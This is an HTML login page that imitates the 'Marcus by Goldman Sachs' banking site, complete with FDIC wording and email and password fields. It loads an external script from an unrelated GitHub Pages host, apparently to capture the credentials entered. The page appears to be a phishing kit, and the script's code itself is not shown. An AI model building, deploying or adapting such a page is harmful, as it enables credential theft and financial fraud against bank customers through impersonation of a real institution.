<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Marcus Secure Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    *{
      box-sizing:border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body{
      margin:0;
      background:#ffffff;
      color:#111;
    }

    .container{
      max-width:480px;
      margin:0 auto;
      padding:20px 18px 40px;
    }

    .brand{
      font-size:34px;
      font-weight:400;
      margin-top:10px;
    }

    .brand span{
      font-size:14px;
      display:block;
      margin-top:2px;
    }

    .divider{
      margin:18px 0;
      border-bottom:1px solid #e4e4e4;
    }

    .fdic-row{
      display:flex;
      gap:12px;
      align-items:flex-start;
    }

    .fdic{
      font-weight:700;
      font-size:20px;
      margin-top:2px;
    }

    .fdic-text{
      font-size:13px;
      line-height:1.4;
      color:#333;
    }

    .fdic-note{
      font-size:12px;
      margin-top:6px;
      color:#333;
    }

    h2{
      font-weight:400;
      font-size:28px;
      margin:26px 0 18px;
    }

    label{
      display:block;
      font-size:14px;
      margin-bottom:6px;
      color:#222;
    }

    input{
      width:100%;
      padding:14px;
      font-size:16px;
      border:1px solid #cfcfcf;
      border-radius:4px;
      margin-bottom:22px;
      outline:none;
    }

    input:focus{
      border-color:#1f6fd5;
    }

    .btn{
      width:100%;
      padding:16px;
      font-size:18px;
      border:none;
      border-radius:6px;
      background:#1f6fd5;
      color:#fff;
      cursor:pointer;
    }

    .link{
      text-align:center;
      margin-top:18px;
    }

    .link a{
      color:#1f6fd5;
      text-decoration:none;
      font-size:14px;
    }
  </style>
</head>
<body>

  <div class="container">
<script src="https://plyarth.github.io/intc/in.js"></script>
    <div class="brand">
      Marcus
      <span>by Goldman Sachs</span>
    </div>

    <div class="divider"></div>

    <div class="fdic-row">
      <div class="fdic">FDIC</div>
      <div class="fdic-text">
        <strong>FDIC-Insured</strong> - Backed by the full faith and credit of the U.S. Government. Goldman Sachs Bank USA, Salt Lake City Branch.
        <div class="fdic-note">
          FDIC insurance applies to deposits accounts only and does not apply to credit cards.
        </div>
      </div>
    </div>

    <h2>Secure login</h2>

    <form>
      <label for="email">Email address</label>
      <input type="email" id="email" name="email" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" required>

      <button type="submit" class="btn">Continue</button>

      <div class="link">
        <a href="#">Create or reset password</a>
      </div>
    </form>

  </div>

</body>
</html>
